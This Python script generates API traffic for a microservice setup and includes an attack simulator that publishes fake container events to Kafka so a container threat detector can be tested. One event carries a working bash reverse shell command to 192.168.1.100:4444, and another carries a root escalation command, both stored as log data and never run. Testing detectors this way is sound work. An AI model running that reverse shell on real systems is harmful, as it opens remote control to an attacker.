#!/usr/bin/env python3
"""
Application Layer Traffic Generator
Makes API calls to generate application logs continuously
"""

import requests
import time
import json
from datetime import datetime

API_BASE = "http://api-gateway:80/api"

def make_request(method, endpoint, data=None):
    """Make an API request and return the response"""
    url = f"{API_BASE}{endpoint}"
    try:
        if method == "GET":
            response = requests.get(url, timeout=5)
        elif method == "POST":
            response = requests.post(url, json=data, timeout=5)
        else:
            return None
        return response
    except Exception as e:
        print(f"[App Traffic] Request failed: {e}")
        return None

def main():
    print("[App Traffic] 🚀 Starting application traffic generator...")
    print("[App Traffic] Press Ctrl+C to stop\n")
    
    request_id = 0
    
    try:
        while True:
            print(f"[App Traffic] {request_id}: Health check - auth-service")
            make_request("GET", "/auth/health")
            
            print(f"[App Traffic] {request_id}: Health check - payment-service")
            make_request("GET", "/payment/health")
            
            print(f"[App Traffic] {request_id}: Health check - notification-service")
            make_request("GET", "/notification/health")
            
            user_data = {
                "email": f"user{request_id}@example.com",
                "password": "password123"
            }
            print(f"[App Traffic] {request_id}: Register user")
            make_request("POST", "/auth/register", user_data)
            
            login_data = {
                "email": f"user{request_id}@example.com",
                "password": "password123"
            }
            print(f"[App Traffic] {request_id}: Login")
            make_request("POST", "/auth/login", login_data)
            
            payment_data = {
                "userId": request_id,
                "amount": 100.00,
                "currency": "USD"
            }
            print(f"[App Traffic] {request_id}: Process payment")
            make_request("POST", "/payment/process", payment_data)
            
            request_id += 1
            time.sleep(2)
    
    except KeyboardInterrupt:
        print("\n[App Traffic] 🛑 Shutting down...")
        print(f"[App Traffic] ✅ Generated {request_id} request cycles")

def simulate_attack():
    """
    Simulate a reverse shell attack on container layer
    """
    from kafka import KafkaProducer
    
    try:
        producer = KafkaProducer(
            bootstrap_servers=['kafka:9092'],
            value_serializer=lambda v: json.dumps(v).encode('utf-8'),
            retries=3
        )
        print("[Attack Simulator] ✅ Connected to Kafka")
    except Exception as e:
        print(f"[Attack Simulator] ❌ Failed: {e}")
        return
    
    print("\n🚨 [ATTACK SIMULATOR] Reverse shell attack...\n")
    
    # Step 1: Create malicious container
    print("[Step 1] Creating malicious container...")
    event1 = {
        'timestamp': datetime.utcnow().isoformat(),
        'type': 'container',
        'action': 'create',
        'actor_id': 'malicious_xyz',
        'actor_attributes': {'name': 'backdoor', 'image': 'attacker/malware:latest'}
    }
    producer.send('container-logs', value=event1)
    print(f"   📤 Sent: {event1['action']}")
    time.sleep(2)
    
    # Step 2: Start container
    print("[Step 2] Starting container...")
    event2 = {
        'timestamp': datetime.utcnow().isoformat(),
        'type': 'container',
        'action': 'start',
        'actor_id': 'malicious_xyz',
        'actor_attributes': {'name': 'backdoor'}
    }
    producer.send('container-logs', value=event2)
    print(f"   📤 Sent: {event2['action']}")
    time.sleep(2)
    
    # Step 3: Execute reverse shell
    print("[Step 3] Executing reverse shell...")
    event3 = {
        'timestamp': datetime.utcnow().isoformat(),
        'type': 'container',
        'action': 'exec_create',
        'actor_id': 'malicious_xyz',
        'actor_attributes': {'name': 'backdoor', 'command': 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'}
    }
    producer.send('container-logs', value=event3)
    print(f"   📤 Sent: REVERSE SHELL COMMAND")
    time.sleep(2)
    
    # Step 4: Privilege escalation
    print("[Step 4] Privilege escalation attempt...")
    event4 = {
        'timestamp': datetime.utcnow().isoformat(),
        'type': 'container',
        'action': 'exec_create',
        'actor_id': 'malicious_xyz',
        'actor_attributes': {'name': 'backdoor', 'command': 'sudo su - root'}
    }
    producer.send('container-logs', value=event4)
    print(f"   📤 Sent: PRIVILEGE ESCALATION")
    time.sleep(2)
    
    print("\n✅ Attack simulation complete!")
    print("   Check Container Detector for threat detection\n")
    producer.close()

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == 'attack':
        simulate_attack()
    else:
        main()
